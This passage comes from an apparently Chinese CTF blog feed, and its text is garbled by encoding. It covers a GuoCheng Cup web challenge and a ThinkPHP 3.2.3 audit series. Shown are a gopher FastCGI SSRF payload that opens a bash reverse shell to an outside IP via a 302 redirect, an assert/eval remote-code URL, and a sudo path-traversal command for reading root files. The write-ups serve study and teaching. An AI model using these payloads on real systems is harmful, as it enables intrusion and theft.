src="/2024/12/08/%E5%9B%BD%E5%9F%8E%E6%9D%AF/IMG_20241210-170440598.png" class=""><br>çœ‹æºç ä¹Ÿå¯ä»¥çœ‹å‡ºå…¶æ˜¯ä¸€ä¸ªssrfçš„æ´<br><img src="/2024/12/08/%E5%9B%BD%E5%9F%8E%E6%9D%AF/IMG_20241210-170506373.png" class="">  </p><p>çœ‹åˆ°phpå…¶å®æˆ‘ä»¬å¯ä»¥åƒåˆ°ä½¿ç”¨ssrfæ‰“fastcgi<br>è¿™é‡Œæˆ‘ä»¬ç›´æ¥ä½¿ç”¨è„šæœ¬æ¥è·‘payload</p><img src="/2024/12/08/%E5%9B%BD%E5%9F%8E%E6%9D%AF/IMG_20241210-184425409.png" class="">  <p>ç„¶åæˆ‘ä»¬çœ‹è¿™ä¸ªåè®®æ˜¯gopher://åè®®çš„ï¼Œä½†æ˜¯å…¶ç™½åå•è¦æ±‚ä¸ºhttpsåè®®çš„<br>æˆ‘ä»¬å¯ä»¥å»ºä¸€ä¸ª302è·³è½¬æ¥è¿›è¡Œbypass<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">header(&quot;Location: gopher://127.0.0.1:9000/_%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%01%05%05%00%0F%10SERVER_SOFTWAREgo%20/%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP/1.1%0E%03CONTENT_LENGTH106%0E%04REQUEST_METHODPOST%09KPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Aauto_prepend_file%20%3D%20php%3A//input%0F%17SCRIPT_FILENAME/var/www/html/index.php%0D%01DOCUMENT_ROOT/%00%00%00%00%00%01%04%00%01%00%00%00%00%01%05%00%01%00j%04%00%3C%3Fphp%20system%28%27bash%20-c%20%22bash%20-i%20%3E%26%20/dev/tcp/111.230.38.159/7777%200%3E%261%22%27%29%3Bdie%28%27-----Made-by-SpyD3r-----%0A%27%29%3B%3F%3E%00%00%00%00&quot;)</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><img src="/2024/12/08/%E5%9B%BD%E5%9F%8E%E6%9D%AF/IMG_20241210-184513574.png" class="">  <p>å¼¹äº†shellå…¨å±€æ‰¾ä¸€ä¸‹flag<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -name &quot;flag*&quot;</span><br></pre></td></tr></table></figure></p><img src="/2024/12/08/%E5%9B%BD%E5%9F%8E%E6%9D%AF/IMG_20241210-185811967.png" class="">  <img src="/2024/12/08/%E5%9B%BD%E5%9F%8E%E6%9D%AF/IMG_20241210-185905663.png" class="">  <p>å‘Šè¯‰æˆ‘ä»¬è¦ææƒï¼Œé‚£å°±å†™ä¸ªé©¬å¥½æ“ä½œ</p><img src="/2024/12/08/%E5%9B%BD%E5%9F%8E%E6%9D%AF/IMG_20241210-190007860.png" class="">  <p>sudo -l å¯ä»¥å‘ç° /bin/cat /tmp/whereflag/*è¿™æ¡æŒ‡ä»¤æ˜¯å¯ä»¥æ— å¯†ç ä½¿ç”¨sudoæƒé™çš„</p><p>å¯ä»¥ç”¨ç›®å½•ç©¿è¶Šæ¥è¯»å–rootä¸‹çš„flag<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo cat /tmp/whereflag/../../root/flag</span><br></pre></td></tr></table></figure><br><img src="/2024/12/08/%E5%9B%BD%E5%9F%8E%E6%9D%AF/IMG_20241210-190151753.png" class="">  </p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>DASCTF Apr.2023å¤ç°</title>
      <link href="/2024/12/05/DASCTF-Apr-2023%E5%A4%8D%E7%8E%B0/"/>
      <url>/2024/12/05/DASCTF-Apr-2023%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>thinkphp3.2.3å®¡è®¡ä¸“é¢˜</title>
      <link href="/2024/11/29/tp%E4%B8%93%E9%A2%98/"/>
      <url>/2024/11/29/tp%E4%B8%93%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<h1 id="urlæ¨¡å¼"><a href="#urlæ¨¡å¼" class="headerlink" title="urlæ¨¡å¼"></a>urlæ¨¡å¼</h1><h2 id="æ™®é€šæ¨¡å¼"><a href="#æ™®é€šæ¨¡å¼" class="headerlink" title="æ™®é€šæ¨¡å¼"></a>æ™®é€šæ¨¡å¼</h2><p>tpçš„è·¯ç”±ç»“æ„æ˜¯ç”±<code>æ¨¡å—</code>,<code>æ§åˆ¶å™¨</code>,<code>æ–¹æ³•</code>ç»„æˆçš„</p><img src="/2024/11/29/tp%E4%B8%93%E9%A2%98/IMG_20241129-164601322.png" class="">  <p>tpä¸­é»˜è®¤çš„æ§åˆ¶å™¨å°±æ˜¯IndexController</p><p>æ¨¡å—å…¶å®å°±æ˜¯ä¸Šå±‚æ–‡ä»¶å¤¹åç§°,ä¹Ÿå¯ä»¥ä»ä»£ç ä¸­çœ‹å‡ºæ¥<br><img src="/2024/11/29/tp%E4%B8%93%E9%A2%98/IMG_20241129-164855744.png" class="">  </p><p>æ§åˆ¶å™¨æ–¹æ³•å…¶å®å°±æ˜¯ç±»åº•ä¸‹çš„æ–¹æ³•äº†</p><p>ä¸åŒtpçš„ç‰ˆæœ¬ä¼šæœ‰äº›è®¸å·®å¼‚ä½†æœ¬è´¨è¿˜æ˜¯æ²¡æœ‰åŒºåˆ«<br><img src="/2024/11/29/tp%E4%B8%93%E9%A2%98/IMG_20241129-185102283.png" class=""><br>éƒ½æ˜¯æ–‡ä»¶åï¼Œç±»åï¼Œæ–¹æ³•å</p><p>å…¶urlçš„è®¿é—®å½¢å¼å°±æ˜¯</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://xxxxx/?m=Home&amp;c=Index&amp;a=h_n&amp;xxx=xxx</span><br></pre></td></tr></table></figure><p>mä»£è¡¨æ¨¡å—å<br>cä»£è¡¨æ§åˆ¶å™¨å<br>aå°±æ˜¯æ–¹æ³•å<br>xxxå°±æ˜¯å…¶ä»–å‚æ•°äº†</p><h2 id="PATHINFOæ¨¡å¼"><a href="#PATHINFOæ¨¡å¼" class="headerlink" title="PATHINFOæ¨¡å¼"></a>PATHINFOæ¨¡å¼</h2><p>è¿™ä¸ªæ¨¡å¼çš„urlç»“æ„å¦‚ä¸‹<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://xxxxx/index.php/Home/Index/h_n?xxx=xxxx</span><br></pre></td></tr></table></figure><br>è¿™ä¸ªæ–¹æ³•åŒæ ·æ˜¯æ¨¡å—,æ§åˆ¶å™¨,æ–¹æ³•,è€Œå‚æ•°å°±å¯ä»¥å€¼ä½¿ç”¨æ­£å¸¸çš„?æ¥ä¼ <br>æˆ‘ä»¬ä¹Ÿå¯ä»¥é€šè¿‡å¦‚ä¸‹æ–¹å¼æ¥ä¼ å‚<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/?s=/Home/Index/h_n/name/LSE</span><br></pre></td></tr></table></figure><br><img src="/2024/11/29/tp%E4%B8%93%E9%A2%98/IMG_20241129-170044965.png" class="">  </p><p>å½“ç„¶æˆ‘ä»¬ä¹Ÿå¯ä»¥åƒè¿™æ ·è®¿é—®æ–¹æ³•</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://xxxxxx/?s=/Home/Index/h_n&amp;xxx=xxxx</span><br><span class="line">http://xxxxxx/?s=/Home/Index/h_n/key/value</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="REWRITEæ¨¡å¼and"><a href="#REWRITEæ¨¡å¼and" class="headerlink" title="REWRITEæ¨¡å¼and"></a>REWRITEæ¨¡å¼and</h2><p>å‰©ä¸‹ä¸¤ç§çš„å·®åˆ«ä¹Ÿä¸å¤§æˆ‘å°±ç›´æ¥è´´æ‰‹å†Œäº†<br><a href="https://www.kancloud.cn/manual/thinkphp/1697">https://www.kancloud.cn/manual/thinkphp/1697</a></p><h1 id="è·¯ç”±"><a href="#è·¯ç”±" class="headerlink" title="è·¯ç”±"></a>è·¯ç”±</h1><p>æ‰‹å†Œé‡Œè®²çš„å…¶å®å¾ˆæ¸…æ¥šäº†ï¼Œå”¯ä¸€è¦æ³¨æ„çš„æ˜¯å†ä¸åŒç›®å½•ä¸‹çš„config.phpçš„è·¯ç”±å®šä¹‰å·®åˆ«<br>å¦‚æœå†æ¨¡å—ä¸‹çš„config.phpå®šä¹‰æ—¶æ—¶å¦‚ä¸‹çš„<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;URL_ROUTE_RULES&#x27;</span> =&gt; array(</span><br><span class="line">    <span class="string">&#x27;shell/:cmd&#x27;</span> =&gt; array(<span class="string">&#x27;Index/shell&#x27;</span>,<span class="string">&#x27;haha=123&#x27;</span>)</span><br><span class="line">    )</span><br></pre></td></tr></table></figure><br>ä¸Šé¢çš„æ˜ å°„æ˜¯å°†Homeæ§åˆ¶å™¨å³é»˜è®¤æ§åˆ¶å™¨åº•ä¸‹çš„shellæ˜ å°„åˆ°Index/shellã€‚<br>å†è®¿é—®æ—¶çš„urlå˜åŒ–å…¶å®æ˜¯ä¸‹é¢è¿™æ ·çš„<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://xxxx/index.php/Home/Index/shell =&gt; http://xxxxx/index.php/Home/Index/shell</span><br></pre></td></tr></table></figure><br><img src="/2024/11/29/tp%E4%B8%93%E9%A2%98/IMG_20241129-231823765.png" class="">  </p><p>æ˜¯çš„å†æ¨¡å—æ–‡ä»¶ä¸‹çš„configå®šä¹‰çš„è·¯ç”±å‰é¢é»˜è®¤ä¼šæœ‰åº”è¯¥æ¨¡å—å</p><p>è€Œåœ¨appä¸‹å³åº”ç”¨ç›®å½•ä¸‹ï¼Œå…¶å®å°±æ˜¯å†å…¨å±€å®šä¹‰äº†ï¼Œæˆ‘ä»¬çš„å®šä¹‰æ–¹æ³•å’Œæ¨¡å—çš„æœ‰å°å°çš„ä¸åŒã€‚<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#x27;URL_ROUTE_RULES&#x27; =&gt; array(</span><br><span class="line">    &#x27;shell/:cmd&#x27; =&gt; array(&#x27;Home/Index/shell&#x27;,&#x27;haha=123&#x27;)</span><br><span class="line">    )</span><br></pre></td></tr></table></figure><br>å†æŒ‡å®šåé¢çš„è·¯ç”±æ—¶æˆ‘ä»¬éœ€è¦è¿åŒæ¨¡å—ä¸€èµ·å¸¦ä¸Š<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://xxxx/index.php/Index/shell =&gt; http://xxxxx/index.php/Home/Index/shell</span><br></pre></td></tr></table></figure><br><img src="/2024/11/29/tp%E4%B8%93%E9%A2%98/IMG_20241129-231845509.png" class="">  </p><h2 id="web570"><a href="#web570" class="headerlink" title="web570"></a>web570</h2><p>é¦–å…ˆè¿™ä¸ªé™„ä»¶ç»™çš„æ˜¯APPç›®å½•å³å…¶å®šä¹‰çš„è·¯ç”±æ˜¯å…¨å±€è·¯ç”±<br><img src="/2024/11/29/tp%E4%B8%93%E9%A2%98/IMG_20241129-175226674.png" class=""><br>æœconfig.phpå¯ä»¥å‘ç°å…¶å®šä¹‰çš„ä»£ç <br>å…¶åˆ©ç”¨äº†é—­åŒ…è·¯ç”±<br><img src="/2024/11/29/tp%E4%B8%93%E9%A2%98/IMG_20241129-232151753.png" class=""><br>å…¶å°†ctfshowåçš„ä¸¤ä¸ªå‚æ•°ä¼ åˆ°call_user_funcè¿™ä¸ªå›è°ƒå‡½æ•°é‡Œ<br>æˆ‘ä»¬ç›´æ¥é€šè¿‡assertæ¥å‘½ä»¤æ‰§è¡Œ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https://b25276a0-7954-4adf-b6e4-3fffcd5e0d8f.challenge.ctf.show/index.php/ctfshow/assert/eval(&quot;$_POST[1]&quot;)</span><br><span class="line"></span><br><span class="line">1=system(&quot;cat /flag_is_here&quot;);</span><br></pre></td></tr></table></figure><img src="/2024/11/29/tp%E4%B8%93%E9%A2%98/IMG_20241129-175151491.png" class="">  <h1 id="showå‘½ä»¤æ‰§è¡Œ"><a href="#showå‘½ä»¤æ‰§è¡Œ" class="headerlink" title="showå‘½ä»¤æ‰§è¡Œ"></a>showå‘½ä»¤æ‰§è¡Œ</h1><h2 id="æ— ç¼“å­˜ï¼Œé»˜è®¤çš„thinkå¼•æ“-å› ä¸ºphpå¼•æ“çš„å‘½ä»¤æ‰§è¡Œæ¯”è¾ƒç®€å•æœ‰æä¸€å˜´phpå¼•æ“"><a href="#æ— ç¼“å­˜ï¼Œé»˜è®¤çš„thinkå¼•æ“-å› ä¸ºphpå¼•æ“çš„å‘½ä»¤æ‰§è¡Œæ¯”è¾ƒç®€å•æœ‰æä¸€å˜´phpå¼•æ“" class="headerlink" title="æ— ç¼“å­˜ï¼Œé»˜è®¤çš„thinkå¼•æ“(å› ä¸ºphpå¼•æ“çš„å‘½ä»¤æ‰§è¡Œæ¯”è¾ƒç®€å•æœ‰æä¸€å˜´phpå¼•æ“)"></a>æ— ç¼“å­˜ï¼Œé»˜è®¤çš„thinkå¼•æ“(å› ä¸ºphpå¼•æ“çš„å‘½ä»¤æ‰§è¡Œæ¯”è¾ƒç®€å•æœ‰æä¸€å˜´phpå¼•æ“)</h2><p>å†thinkphp3.2.3ä¸­showå‡½æ•°å­˜åœ¨ç€å‘½ä»¤æ‰§è¡Œçš„é—®é¢˜ã€‚ä¸‹é¢ä¼šå°†ä¼šå¯¹å…¶è¿›è¡Œåˆ†æ<br><img src="/2024/11/29/tp%E4%B8%93%E9%A2%98/IMG_20241130-154353365.png" class=""><br><img src="/2024/11/29/tp%E4%B8%93%E9%A2%98/IMG_20241130-154411823.png" class=""><br>æ­¥å…¥fetchå‡½æ•°<br><img src="/2024/11/29/tp%E4%B8%93%E9%A2%98/IMG_20241130-154459704.png" class=""><br>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°å½“TMPL_ENGINE_TYPEçš„é…ç½®ä¿¡æ¯ä¸ºphpæ—¶ä¼šç›´æ¥å°†æˆ‘ä»¬ä¼ å…¥showçš„å‚æ•°æ”¾å…¥evalä¸­å‘½ä»¤æ‰§è¡Œ<br><img src="/2024/11/29/tp%E4%B8%93%E9%A2%98/IMG_20241130-155154304.png" class=""><br>Cå‡½æ•°çš„ä½œç”¨å°±æ˜¯ä»configä¸­æå–TMPL_ENGINE_TYPEçš„å†…å®¹</p><img src="/2024/11/29/tp%E4%B8%93%E9%A2%98/IMG_20241130-155249459.png" class="">  <p>é»˜è®¤çš„ä¸ºThink<br><img src="/2024/11/29/tp%E4%B8%93%E9%A2%98/IMG_20241130-155355534.png" class=""><br>ä¹‹åå°†æˆ‘ä»¬ä¼ å…¥çš„å‚æ•°ç»„æˆarrayç„¶åä¼ å…¥listenè§£æå‡ºå¤„ç†</p><img src="/2024/11/29/tp%E4%B8%93%E9%A2%98/IMG_20241130-155708786.png" class="">  <p>è¿›å…¥listenåä¼šå‘ç°ä¸€ä¸ªç±»ä¸‹çš„execå‡½æ•°</p><img src="/2024/11/29/tp%E4%B8%93%E9%A2%98/IMG_20241130-155921909.png" class="">  <p>å°†tagèµ‹å€¼ä¸ºRunå¹¶ä¸”å®ä¾‹åŒ–nameæŒ‡å‘çš„ç±»</p><p>ä¹Ÿå°±æ˜¯æœ€åè¿”å›çš„æ—¶ReadHtmlCacheBehavior-&gt;Run($params)</p><p>è€Œ$paramsä¹Ÿå°±æ˜¯æˆ‘ä»¬ä¹‹å‰ä¼ å…¥çš„å‚æ•°ç»è¿‡åŒ…è£…åçš„æ•°ç»„</p><img src="/2024/11/29/tp%E4%B8%93%E9%A2%98/IMG_20241130-160432166.png" class="">  <img src="/2024/11/29/tp%E4%B8%93%E9%A2%98/IMG_20241130-160545701.png" class="">  <p>ä¹‹åå°±æ˜¯åˆ¤æ–­å¼•æ“ï¼Œä¹Ÿå°±æ˜¯thinkï¼Œç„¶åè·å–æˆ‘ä»¬ä¼ å…¥showçš„å‚æ•°ï¼Œå’Œå‰ç¼€(ä¸å¤ªæ¸…æ¥šè¿™æ˜¯å•¥)<br>ç„¶åè¿›å…¥ifåˆ¤æ–­ï¼Œæ£€æŸ¥ä¸€ä¸‹æ˜¯å¦å­˜åœ¨ç¼“å­˜ï¼Œå­˜åœ¨å°±ç›´æ¥é€šè¿‡Storage::loadåŠ è½½ã€‚å› ä¸ºæˆ‘ä»¬æ˜¯ç¬¬ä¸€æ¬¡è¿›å…¥æ‰€ä»¥å¹¶æ²¡æœ‰ç¼“å­˜ã€‚<br><img src="/2024/11/29/tp%E4%B8%93%E9%A2%98/IMG_20241130-161610565.png" class=""><br>å¯¹tplè¿›è¡Œèµ‹å€¼ æ­¥å…¥instanceæ–¹æ³•ã€‚<br><img src="/2024/11/29/tp%E4%B8%93%E9%A2%98/IMG_20241130-161820115.png" class=""><br>å¯ä»¥å‘ç°å…¶åˆ¤æ–­ä¼ å…¥çš„è·¯å¾„æ˜¯å¦ä¸ºå®ä¾‹ï¼Œæ˜¯å¦ä¸ºç±»ï¼Œå¦‚æœä¸æ˜¯å®ä¾‹ä½†æ˜¯ä¸ºç±»å°±å°†å…¶å®ä¾‹åŒ–è¿”å›ã€‚<br>è¿”å›çš„ç±»æ˜¯Template<br><img src="/2024/11/29/tp%E4%B8%93%E9%A2%98/IMG_20241130-161339372.png" class=""><br>ç„¶åä½¿ç”¨è¿™ä¸ªç±»çš„fetch<br><img src="/2024/11/29/tp%E4%B8%93%E9%A2%98/IMG_20241130-162259764.png" class=""><br>ä¹‹åè¿›å…¥loadTemplate<br><img src="/2024/11/29/tp%E4%B8%93%E9%A2%98/IMG_20241130-162539859.png" class=""><br>å…¶ä¼šåˆ¤æ–­ä¼ å…¥çš„å‚æ•°æ˜¯å¦ä¸ºæ–‡ä»¶ï¼Œä¸ä¸ºæ–‡ä»¶å°±ä¼šå°è¯•å†™å…¥ç¼“å­˜ï¼Œç¼“å­˜çš„è·¯å¾„ä¸ºï¼Œé…ç½®ä¸­çš„ç¼“å­˜è·¯å¾„åŠ ä¸Šã€‚æ–‡ä»¶åä¸ºç¼“å­˜çš„å†…å®¹ï¼Œæ‹¼æ¥ä¸Šè®¾ç½®é¢„è®¾çš„ç¼“å­˜åç¼€ã€‚é»˜è®¤ä¸º.php</p><p>ç„¶åå¤„ç†è¦å†™å…¥çš„å†…å®¹<br><img src="/2024/11/29/tp%E4%B8%93%E9%A2%98/IMG_20241130-163012387.png" class=""><br>æœ€ç»ˆæ¸²æŸ“ç»“æœä¸ºï¼Œåœ¨å‰é¢åŠ ä¸€ä¸ªåˆ¤æ–­æ˜¯å¦å®šä¹‰THINK_PATHçš„å‡½æ•°ï¼Œå¦‚æœå®šä¹‰äº†å°±å¯ä»¥æŒ‡å‘åé¢çš„ä»£ç ï¼Œå³æˆ‘ä»¬ä¼ å…¥çš„å‚æ•°</p><p>ç„¶åè°ƒç”¨Storageçš„putæ–¹æ³•ã€‚<br><img src="/2024/11/29/tp%E4%B8%93%E9%A2%98/IMG_20241130-163314988.png" class=""><br>å› ä¸ºå…¶æ²¡æœ‰putæ–¹æ³•äºæ˜¯è§¦å‘äº†<code>__callstatic</code>(<code>__callstatic</code>ä¸<code>__call</code>ç›¸ä¼¼åªæ˜¯å‰è€…ç”¨äºç±»åè€…ç”¨äºå¯¹è±¡)é‚£ä¹ˆ<code>$method</code>å°±ä¸ºputè€Œ<code>$args</code>å°±ä¸ºä¸€ä¸ªå­˜å‚¨è·¯å¾„å’Œå†™å…¥å†…å®¹çš„ä¸€ä¸ªæ•°ç»„</p><p>ã€‚ç„¶åä½¿ç”¨å›è°ƒå‡½æ•°æ¥è°ƒç”¨<code>self::$handler</code>çš„putæ–¹æ³•ï¼Œå‚æ•°ä¸º<code>$arg</code><br>è€Œ<code>self::$handler</code>åœ¨connectæ–¹æ³•æœ‰è¿›è¡Œèµ‹å€¼èµ‹å€¼</p><p>å¦‚æœæˆ‘ä»¬åœ¨ä¸€å¼€å§‹ä¼ å‚ä¹‹å‰å°±åœ¨è¿™é‡Œä¸‹ä¸ªæ–­ç‚¹ä¼šå‘ç°å…¶å®åœ¨ä¸€å¼€å§‹ä¼ å‚å°±å·²ç»ç›´æ¥è¿è¡Œåˆ°äº†è¿™é‡Œ<br><img src="/2024/11/29/tp%E4%B8%93%E9%A2%98/IMG_20241130-164009402.png" class=""><br>å…¶å®ä¾‹åŒ–çš„ç±»ä¸ºFileç±»ã€‚æˆ‘ä»¬çœ‹ä¸€ä¸‹è¿™ä¸ªç±»<br><img src="/2024/11/29/tp%E4%B8%93%E9%A2%98/IMG_20241130-164103876.png" class=""><br>å…¶putæ–¹æ³•å°±æ˜¯ä¸€ä¸ªæ–‡ä»¶å†™å…¥çš„æ–¹æ³•</p><p>å†™å…¥æ–‡ä»¶åä¼šè°ƒç”¨åˆ°<br><img src="/2024/11/29/tp%E4%B8%93%E9%A2%98/IMG_20241130-164600618.png" class="">  </p><p>Stirage::loadåŒæ ·æ²¡æœ‰è¿™ä¸ªæ–¹æ³•ï¼Œæ‰€ä»¥ä¼šåŠ è½½åˆ°Fileçš„loadæ–¹æ³•ä¸­<br><img src="/2024/11/29/tp%E4%B8%93%E9%A2%98/IMG_20241130-164719561.png" class=""><br>è€Œfilenameå°±æ˜¯ç¼“å­˜çš„è·¯å¾„<br>è¿™æ ·å°±å¯¼è‡´äº†æ–‡ä»¶åŒ…å«ï¼Œä»è€Œè¿›è¡Œäº†å‘½ä»¤æ‰§è¡Œ</p><h2 id="æœ‰ç¼“å­˜"><a href="#æœ‰ç¼“å­˜" class="headerlink" title="æœ‰ç¼“å­˜"></a>æœ‰ç¼“å­˜</h2><img src="/2024/11/29/tp%E4%B8%93%E9%A2%98/IMG_20241130-165031018.png" class="">  <p>æˆ‘ä»¬ç›´æ¥è°ƒåˆ°ä¹‹å‰åˆ¤æ–­æœ‰æ— ç¼“å­˜çš„éƒ¨åˆ†<br><img src="/2024/11/29/tp%E4%B8%93%E9%A2%98/IMG_20241130-165432299.png" class=""><br>å…¶chekç¼“å­˜çš„æ–¹æ³•å…¶å®å°±æ˜¯è°ƒç”¨Fileç±»çš„hasæ–¹æ³•æ¥æŸ¥çœ‹æ˜¯å¦å­˜åœ¨ç¼“å­˜æ–‡ä»¶</p><p>ä¼šå‘ç°å¦‚æœæœ‰ç¼“å­˜ä¼šç›´æ¥è°ƒç”¨Storage::load<br>Storage::loadå…¶å®å°±æ˜¯æ–‡ä»¶åŒ…å«äº†</p><p><strong>çº æ­£ä¸€ä¸‹æˆ‘åˆšæ‰åœ¨ä¸Šé¢è¯´çš„éƒ½æ˜¯å®ä¾‹åŒ–ç±»ï¼Œä½†å…¶å®åº”è¯¥å«å®ä¾‹åŒ–æ§åˆ¶å™¨ï¼Œè™½ç„¶å…¶å®éƒ½å·®ä¸å¤š</strong><br><img src="/2024/11/29/tp%E4%B8%93%E9%A2%98/IMG_20241130-170139702.png" class="">  </p><h2 id="web571"><a href="#web571" class="headerlink" title="web571"></a>web571</h2><img src="/2024/11/29/tp%E4%B8%93%E9%A2%98/IMG_20241130-165734544.png" class="">  <img src="/2024/11/29/tp%E4%B8%93%E9%A2%98/IMG_20241130-165747439.png" class="">  <p>å¯ä»¥å‘ç°åœ¨indexæ–¹æ³•é‡Œå†™äº†ä¸€ä¸ªshowå‡½æ•°ï¼Œè€Œshowå‡½æ•°å†…çš„å‚æ•°</p><img src="/2024/11/29/tp%E4%B8%93%E9%A2%98/IMG_20241130-170336770.png" class="">  <p>ä¸Šé¢æ‰‹å†Œçš„æ–¹æ³•ä¸è¡Œï¼Œå¯èƒ½æ˜¯é…ç½®æ²¡å¼€ï¼Œè¿™é‡Œç›´æ¥getä¼ å€¼å³å¯<br><img src="/2024/11/29/tp%E4%B8%93%E9%A2%98/IMG_20241130-170617069.png" class="">  </p><img src="/2024/11/29/tp%E4%B8%93%E9%A2%98/IMG_20241130-170731111.png" class="">  <h1 id="æ—¥å¿—"><a href="#æ—¥å¿—" class="headerlink" title="æ—¥å¿—"></a>æ—¥å¿—</h1><h2 id="web572"><a href="#web572" class="headerlink" title="web572"></a>web572</h2><p>åœ¨å¼€å¯debugæ˜¯tpä¼šè‡ªåŠ¨è®°å½•æ—¥å¿—ï¼Œè€Œæ—¥å¿—çš„ä½ç½®ä½äº<br>Application/Runtime/Logs/æ¨¡å—/xx_xx_xx.log</p><img src="/2024/11/29/tp%E4%B8%93%E9%A2%98/IMG_20241130-173054080.png" class="">  <img src="/2024/11/29/tp%E4%B8%93%E9%A2%98/IMG_20241130-173103615.png" class="">  <img src="/2024/11/29/tp%E4%B8%93%E9%A2%98/IMG_20241130-173037789.png" class="">  <p>å¯ä»¥å‘ç°æ—¥å¿—é‡Œindex.phpç›´æ¥å°±æ˜¯é©¬<br><img src="/2024/11/29/tp%E4%B8%93%E9%A2%98/IMG_20241130-173328065.png" class="">  </p><h1 id="think3-2-3sqlæ³¨å…¥"><a href="#think3-2-3sqlæ³¨å…¥" class="headerlink" title="think3.2.3sqlæ³¨å…¥"></a>think3.2.3sqlæ³¨å…¥</h1><p>æ„Ÿè§‰å¹²å·´å·´çš„è°ƒä¸‹å»ä¼šå¾ˆæ— èŠï¼Œæ‰€ä»¥æˆ‘è¿™é‡Œå°±æŠŠsqlçš„å‡½æ•°è°ƒä¸€ä¸‹çœ‹çœ‹ï¼Œtpåˆ°åº•æ˜¯æ€ä¹ˆå®ç°è¿™äº›å‡½æ•°çš„</p><h2 id="M"><a href="#M" class="headerlink" title="M"></a>M</h2><p><a href="https://www.thinkphp.cn/info/123.html">https://www.thinkphp.cn/info/123.html</a><br>çœ‹èµ·å®˜æ–¹æ–‡æ¡£å¯ä»¥çŸ¥é“Må‡½æ•°çš„åŸºç¡€ç”¨æ³•ï¼Œå…¶ä½œç”¨å°±æ˜¯å®ä¾‹åŒ–ä¸€ä¸ªæ¨¡å‹ï¼Œè€Œè¿™ä¸ªå‡½æ•°å¯ä»¥åœ¨æ²¡æœ‰å®šä¹‰ä»»ä½•å®ä¾‹æ—¶å®ä¾‹ä¸€ä¸ªæ•°æ®è¡¨çš„æ¨¡å‹ã€‚<br><img src="/2024/11/29/tp%E4%B8%93%E9%A2%98/IMG_20241206-103323864.png" class=""><br>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°å½“æˆ‘ä»¬ä¼ å…¥çš„nameä¸ºxxx:xxxæ—¶å…¶ä¼šåˆ†å‰²ä¼ å…¥<code>$class</code>å’Œ<code>$name</code>å¦‚æœæ²¡æœ‰å®šä¹‰ç±»åå°±èµ‹å€¼ä¸ºé»˜è®¤çš„<code>Think\\Midel</code>æ§åˆ¶å™¨ï¼Œç„¶åå°†<code>connection . $tablePrefix . $name . &#39;_&#39; . $class</code>è¿›è¡Œæ‹¼æ¥ã€‚å› ä¸ºæˆ‘ä»¬æ²¡æœ‰è®¾å®šå‰ç¼€å’Œconnectionï¼Œæ‰€ä»¥è¿”å›çš„å°±æ˜¯nameå’Œclassæ‹¼æ¥çš„ç»“æœã€‚ä»æ–‡æ¡£æˆ‘ä»¬å¯ä»¥çœ‹å‡º<code>$connection</code>æ˜¯ç”¨äºæ•°æ®åº“è¿æ¥çš„å‚æ•°ï¼Œæ‰€ä»¥åé¢åº”è¯¥ä¼šä»é…ç½®ä¸­å¾—åˆ°æ•°æ®åº“è¿æ¥ä¿¡æ¯å¹¶èµ‹å€¼ç»™è¿™ä¸ªå˜é‡</p><p>æ­¥å…¥å®ä¾‹åŒ–ç±»ã€‚<br><img src="/2024/11/29/tp%E4%B8%93%E9%A2%98/IMG_20241206-105137218.png" class=""><br>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°å…¶ç›´æ¥è·³åˆ°äº†autoloadï¼Œè¿™æ˜¯å› ä¸ºå…¶åœ¨ç¨‹åºå¼€å§‹æ—¶åˆå§‹æ—¶çš„æ“ä½œå¯¼è‡´çš„<br><img src="/2024/11/29/tp%E4%B8%93%E9%A2%98/IMG_20241206-105116615.png" class=""><br>æˆ‘ä»¬ç»§ç»­çœ‹autoload()</p><p>å…¶å…ˆæ£€æµ‹mapå†…æœ‰æ²¡æœ‰ç¼“å­˜ï¼Œæœ‰çš„è¯å°±ç›´æ¥æ–‡ä»¶åŒ…å«<br><img src="/2024/11/29/tp%E4%B8%93%E9%A2%98/IMG_20241206-105619667.png" class=""><br><img src="/2024/11/29/tp%E4%B8%93%E9%A2%98/IMG_20241206-105643467.png" class=""><br>ç„¶åè¿›å…¥å…¶<code>__construc</code>,ä¹‹ååˆå§‹åŒ–ä¸ºä¸€ä¸ªvalueå‡ 